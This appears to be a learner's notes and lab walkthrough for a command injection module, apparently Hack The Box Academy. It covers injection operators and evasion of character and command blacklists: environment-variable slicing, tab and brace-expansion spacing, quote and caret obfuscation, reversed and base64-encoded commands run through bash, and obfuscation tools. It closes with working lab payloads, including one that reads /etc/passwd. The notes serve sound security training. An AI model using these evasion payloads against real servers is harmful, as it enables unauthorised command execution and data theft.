# Command Injections

It allows us to execute system commands directly on the back-end hosting server, which could lead to compromising the entire network. If a web application uses user-controlled input to execute a system command on the back-end server to retrieve and return specific output, we may be able to inject a malicious payload to subvert the intended command and execute our commands.
  
Injection vulnerabilities are considered the number 3 risk in [OWASP's Top 10 Web App Risks](https://owasp.org/www-project-top-ten/), given their high impact and how common they are. Injection occurs when user-controlled input is misinterpreted as part of the web query or code being executed, which may lead to subverting the intended outcome of the query to a different outcome that is useful to the attacker.

There are many types of injections found in web applications, depending on the type of web query being executed. The following are some of the most common types of injections:

| Injection                           | Description                                                               |
| ----------------------------------- | ------------------------------------------------------------------------- |
| OS Command Injection                | Occurs when user input is directly used as part of an OS command.         |
| Code Injection                      | Occurs when user input is directly within a function that evaluates code. |
| SQL Injections                      | Occurs when user input is directly used as part of an SQL query.          |
| Cross-Site Scripting/HTML Injection | Occurs when exact user input is displayed on a web page.                  |
There are many other types of injections other than the above, like `LDAP injection`, `NoSQL Injection`, `HTTP Header Injection`, `XPath Injection`, `IMAP Injection`, `ORM Injection`, and others. Whenever user input is used within a query without being properly sanitized, it may be possible to escape the boundaries of the user input string to the parent query and manipulate it to change its intended purpose. This is why as more web technologies are introduced to web applications, we will see new types of injections introduced to web applications.

For example, a web application written in `PHP` may use the `exec`, `system`, `shell_exec`, `passthru`, or `popen` functions to execute commands directly on the back-end server, each having a slightly different use case. The following code is an example of PHP code that is vulnerable to command injections:

Code: php

```php
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>
```
## OR Operator

Finally, let us try the `OR` (`||`) injection operator. The `OR` operator only executes the second command if the first command fails to execute. This may be useful for us in cases where our injection would break the original command without having a solid way of having both commands work. So, using the `OR` operator would make our new command execute if the first one fails.

If we try to use our usual payload with the `||` operator (`127.0.0.1 || whoami`), we will see that only the first command would execute:

  Other Injection Operators

```c
r3so1v3@htb[/htb]$ ping -c 1 127.0.0.1 || whoami

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.635 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.635/0.635/0.635/0.000 ms
```
	
This is because of how `bash` commands work. As the first command returns exit code `0` indicating successful execution, the `bash` command stops and does not try the other command. It would only attempt to execute the other command if the first command failed and returned an exit code `1`.

Such operators can be used for various injection types, like SQL injections, LDAP injections, XSS, SSRF, XML, etc. We have created a list of the most common operators that can be used for injections:

| **Injection Type**                      | **Operators**                                     |
| --------------------------------------- | ------------------------------------------------- |
| SQL Injection                           | `'` `,` `;` `--` `/* */`                          |
| Command Injection                       | `;` `&&`                                          |
| LDAP Injection                          | `*` `(` `)` `&` `\|`                              |
| XPath Injection                         | `'` `or` `and` `not` `substring` `concat` `count` |
| OS Command Injection                    | `;` `&` `\|`                                      |
| Code Injection                          | `'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`  |
| Directory Traversal/File Path Traversal | `../` `..\\` `%00`                                |
| Object Injection                        | `;` `&` `\|`                                      |
| XQuery Injection                        | `'` `;` `--` `/* */`                              |
| Shellcode Injection                     | `\x` `\u` `%u` `%n`                               |
| Header Injection                        | `\n` `\r\n` `\t` `%0d` `%0a` `%09`                |

Another type of injection mitigation is utilizing blacklisted characters and words on the back-end to detect injection attempts and deny the request if any request contained them. Yet another layer on top of this is utilizing Web Application Firewalls (WAFs), which may have a broader scope and various methods of injection detection and prevent various other attacks like SQL injections or XSS attacks

## Filter/WAF Detection
Let us start by visiting the web application in the exercise at the end of this section. We see the same Host Checker web application we have been exploiting, but now it has a few mitigations up its sleeve. We can see that if we try the previous operators we tested, like (;, &&, ||), we get the error message invalid input:
![](https://i.imgur.com/m3oZqpC.png)
This indicates that something we sent triggered a security mechanism in place that denied our request. This error message can be displayed in various ways. In this case, we see it in the field where the output is displayed, meaning that it was detected and prevented by the `PHP` web application itself. `If the error message displayed a different page, with information like our IP and our request, this may indicate that it was denied by a WAF`.

Let us check the payload we sent:
Code bash:
```c
127.0.0.1; whoami
```

Other than the IP (which we know is not blacklisted), we sent:

1. A semi-colon character `;`
2. A space character
3. A `whoami` command

So, the web application either `detected a blacklisted character` or `detected a blacklisted command`, or both. So, let us see how to bypass each.
## Blacklisted Characters

A web application may have a list of blacklisted characters, and if the command contains them, it would deny the request. The `PHP` code may look something like the following:

Code: php

```php
$blacklist = ['&', '|', ';', ...SNIP...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```

If any character in the string we sent matches a character in the blacklist, our request is denied. Before we start our attempts at bypassing the filter, we should try to identify which character caused the denied request.

## Bypass Blacklisted Operators

We will see that most of the injection operators are indeed blacklisted. However, the new-line character is usually not blacklisted, as it may be needed in the payload itself. We know that the new-line character works in appending our commands both in Linux and on Windows, so let's try using it as our injection operator:
![](https://i.imgur.com/oKj3sQN.png)

As we can see, even though our payload did include a new-line character, our request was not denied, and we did get the output of the ping command, `which means that this character is not blacklisted, and we can use it as our injection operator`

Besides injection operators and space characters, a very commonly blacklisted character is the slash (`/`) or backslash (`\`) character, as it is necessary to specify directories in Linux or Windows.

There are many techniques we can utilize to have slashes in our payload. One such technique we can use for replacing slashes (`or any other character`) is through `Linux Environment Variables` like we did with `${IFS}`. While `${IFS}` is directly replaced with a space, there's no such environment variable for slashes or semi-colons. However, these characters may be used in an environment variable, and we can specify `start` and `length` of our string to exactly match this character.

For example, if we look at the `$PATH` environment variable in Linux, it may look something like the following:
```c
r3so1v3@htb[/htb]$ echo ${PATH}

/usr/local/bin:/usr/bin:/bin:/usr/games
```

So, if we start at the `0` character, and only take a string of length `1`, we will end up with only the `/` character, which we can use in our payload:
```shell-session
r3so1v3@htb[/htb]$ echo ${PATH:0:1}

/
```
When we use the above command in our payload, we will not add `echo`, as we are only using it in this case to show the outputted character.

We can do the same with the `$HOME` or `$PWD` environment variables as well. We can also use the same concept to get a semi-colon character, to be used as an injection operator. For example, the following command gives us a semi-colon:

  Bypassing Other Blacklisted Characters
```c
r3so1v3@htb[/htb]$ echo ${LS_COLORS:10:1}

;
```

`${VARIABLE:START:LEN}`, where:

- **VARIABLE** - environment variable.
- **START** - starting position in string (counting from 0).
- **LEN** - amount of symbols you want to extract.

## Bypassing blacklisted commands

### Linux & Windows

One very common and easy obfuscation technique is inserting certain characters within our command that are usually ignored by command shells like `Bash` or `PowerShell` and will execute the same command as if they were not there. Some of these characters are a single-quote `'` and a double-quote `"`, in addition to a few others.

The easiest to use are quotes, and they work on both Linux and Windows servers. For example, if we want to obfuscate the `whoami` command, we can insert single quotes between its characters, as follows:
```c
21y4d@htb[/htb]$ w'h'o'am'i

21y4d
```

The same works with double-quotes as well:
```c
21y4d@htb[/htb]$ w"h"o"am"i

21y4d
```

The important things to remember are that `we cannot mix types of quotes` and `the number of quotes must be even`. We can try one of the above in our payload (`127.0.0.1%0aw'h'o'am'i`) and see if it works:

### Linux Only

We can insert a few other Linux-only characters in the middle of commands, and the `bash` shell would ignore them and execute the command. These characters include the backslash `\` and the positional parameter character `$@`. This works exactly as it did with the quotes, but in this case, `the number of characters do not have to be even`, and we can insert just one of them if we want to:
```c
who$@ami
w\ho\am\i
```

### Windows Only

There are also some Windows-only characters we can insert in the middle of commands that do not affect the outcome, like a caret (`^`) character, as we can see in the following example:
```c
C:\htb> who^ami

21y4d
```

## Advanced Command Obfuscation
If we are dealing with a Windows server, we can change the casing of the characters of the command and send it. In Windows, commands for PowerShell and CMD are case-insensitive, meaning they will execute the command regardless of what case it is written in:
```c
PS C:\htb> WhOaMi

21y4d
```

However, when it comes to Linux and a bash shell, which are case-sensitive, as mentioned earlier, we have to get a bit creative and find a command that turns the command into an all-lowercase word. One working command we can use is the following:
```c
21y4d@htb[/htb]$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

21y4d
```

But the above command will not work in Host Checker as it contains spaces, so we need to replace them with tabs:
```c
tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi
```

There are many other commands we may use for the same purpose, like the following:
```c
$(a="WhOaMi";printf %s "${a,,}")
```

Another command obfuscation technique we will discuss is reversing commands and having a command template that switches them back and executes them in real-time. In this case, we will be writing `imaohw` instead of `whoami` to avoid triggering the blacklisted command.

We can get creative with such techniques and create our own Linux/Windows commands that eventually execute the command without ever containing the actual command words. First, we'd have to get the reversed string of our command in our terminal, as follows:
```c
r3so1v3@htb[/htb]$ echo 'whoami' | rev
imaohw
```

Then, we can execute the original command by reversing it back in a sub-shell (`$()`), as follows:
```c
21y4d@htb[/htb]$ $(rev<<<'imaohw')

21y4d
```


The same can be applied in `Windows.` We can first reverse a string, as follows:
```c
PS C:\htb> "whoami"[-1..-20] -join ''

imaohw
```

We can now use the below command to execute a reversed string with a PowerShell sub-shell (`iex "$()"`), as follows:
```c
PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"

21y4d
```

The final technique we will discuss is helpful for commands containing filtered characters or characters that may be URL-decoded by the server. This may allow for the command to get messed up by the time it reaches the shell and eventually fails to execute. Instead of copying an existing command online, we will try to create our own unique obfuscation command this time. This way, it is much less likely to be denied by a filter or a WAF. The command we create will be unique to each case, depending on what characters are allowed and the level of security on the server.

We can utilize various encoding tools, like `base64` (for b64 encoding) or `xxd` (for hex encoding). Let's take `base64` as an example. First, we'll encode the payload we want to execute (which includes filtered characters):
```c
r3so1v3@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64

Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```

Now we can create a command that will decode the encoded string in a sub-shell (`$()`), and then pass it to `bash` to be executed (i.e. `bash<<<`), as follows:
```c
r3so1v3@htb[/htb]$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

As we can see, the above command executes the command perfectly. We did not include any filtered characters and avoided encoded characters that may lead the command to fail to execute.

Tip: Note that we are using `<<<` to avoid using a pipe `|`, which is a filtered character.

## Evasion Tools
### Linux (Bashfuscator)

A handy tool we can utilize for obfuscating bash commands is [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator). We can clone the repository from GitHub and then install its requirements, as follows:
```c
r3so1v3@htb[/htb]$ git clone https://github.com/Bashfuscator/Bashfuscator
r3so1v3@htb[/htb]$ cd Bashfuscator
r3so1v3@htb[/htb]$ pip3 install setuptools==65
r3so1v3@htb[/htb]$ python3 setup.py install --user
```

Once we have the tool set up, we can start using it from the `./bashfuscator/bin/` directory. There are many flags we can use with the tool to fine-tune our final obfuscated command, as we can see in the `-h` help menu

### Windows (DOSfuscation)

There is also a very similar tool that we can use for Windows called [DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation). Unlike `Bashfuscator`, this is an interactive tool, as we run it once and interact with it to get the desired obfuscated command. We can once again clone the tool from GitHub and then invoke it through PowerShell, as follows:

  Evasion Tools

```c
PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
PS C:\htb> cd Invoke-DOSfuscation
PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
PS C:\htb> Invoke-DOSfuscation
Invoke-DOSfuscation> help
```

# Questions & Answers
### Detection

1.  Try adding any of the injection operators after the ip in IP field. What did the error message say (in English)?

So we can try to insert some symbol like ; in the end of the IP address and get the message: 
"Please match the requested format" which is answer

### Injecting Commands

2. Review the HTML source code of the page to find where the front-end input validation is happening. On which line number is it?

Ctrl + U to view the source code and find line:
```c
<input type="text" name="ip" placeholder="127.0.0.1" pattern="^((\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.){3}(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])$">
```

### Other Injecting Operations

3. Try using the remaining three injection operators (new-line, &, |), and see how each works and how the output differs. Which of them only shows the output of the injected command?

We need to intercept the request with burp and change the IP field to this:
```c
||+whoami
```
It will only return the result of the second command

### Identifying Filters

4.  Try all other injection operators to see if any of them is not blacklisted. Which of (new-line, &, |) is not blacklisted by the web application?

We need to only check these 3 of them and url encoded version of them attached to IP, this worked for me:
```c
ip=127.0.0.1%0a
```
Where %0a is new-line symbol

### Bypassing Space Filters

5.  Use what you learned in this section to execute the command 'ls -la'. What is the size of the 'index.php' file?

So in the section we had 3 main ways of bypassing space filters:
- %09 - Tab (`127.0.0.1%0a%09`)
- ${IFS} - Linux Environment Variable 
   127.0.0.1%0a${IFS}
- {ls,-la} - bash brace expansion
  127.0.0.1%0{ls,-la}

But I need to see the result of ls -la command so I firstly started checking which of the above bypasses works for me and I got:
```c
ip=127.0.0.1%0a%09{ls,-la}
```
where:
- %0a is space
- %09 is tab
- {ls,-la} is 

### Bypassing Other Blacklisted Characters

6. Use what you learned in this section to find name of the user in the '/home' folder. What user did you find?

We can use the same bash brace expression as for prev question but adjust it for our question:
```c
ip=127.0.0.1%0a{ls,-la,${PATH:0:1}home}
```
Here %0a is a new line encoded character which needs to make our command executable instead of ip 127.0.0.1
Next we have bash brace expansion {ls,-la,${PATH:0:1}home} where ${PATH:0:1} prints the / character so we got then ls -la /home  

### Bypassing Blacklisted Commands

7. Use what you learned in this section find the content of flag.txt in the home folder of the user you previously found.

```c
ip=127.0.0.1%0a{c'a't,${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt}
```
As in the question we are asked to look for flag in home directory of the user we are previously found, we can also use bash brace expansion here and add the username we found 1nj3c70r, where ${PATH:0:1} is used to bypass / symbol which is blacklisted

### Advanced Command Obfuscation

8.  Find the output of the following command using one of the techniques you learned in this section: find /usr/share/ | grep root | grep mysql | tail -n 1     

So we will use the encoded method for this task:
```c
echo -n 'find /usr/share/ | grep root | grep mysql | tail -n 1' | base64
ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=
```

Then in order to run this command we use:
```c
bash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
```

So finally we need to add %0a before bash so it will look like this
```c
ip=127.0.0.1%0abash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
```

## Skills Assessment

9.  What is the content of '/flag.txt'?

So first we are provided with creds to login to form
user: guest
password: guest
![](https://i.imgur.com/Q8Ufvbs.png)

Then after logging in we can see the file manager page with some files
![](https://i.imgur.com/CxLXP2C.png)

Now we can click on any file and press copy and select the destination folder i.e we copy last file and the destination folder is /tmp 
![](https://i.imgur.com/4RzEjVE.png)

Then we click move button and intercept our request with burpsuite:
![](https://i.imgur.com/Bwz6uXm.png)

Finally we need to modify the from field and append the following payload command before file name:
%0ac'a't%09${PATH:0:1}flag.txt%0a 
where:
- %0a is a new line 
- c'a't is a obfuscated cat command
- %09 is a tab instead of space 
- ${PATH:0:1} is a linux environment variable which in this case represents / symbol
- flag.txt is the flag file itself
- %0a is a new line which separates the these commands from the actual filename
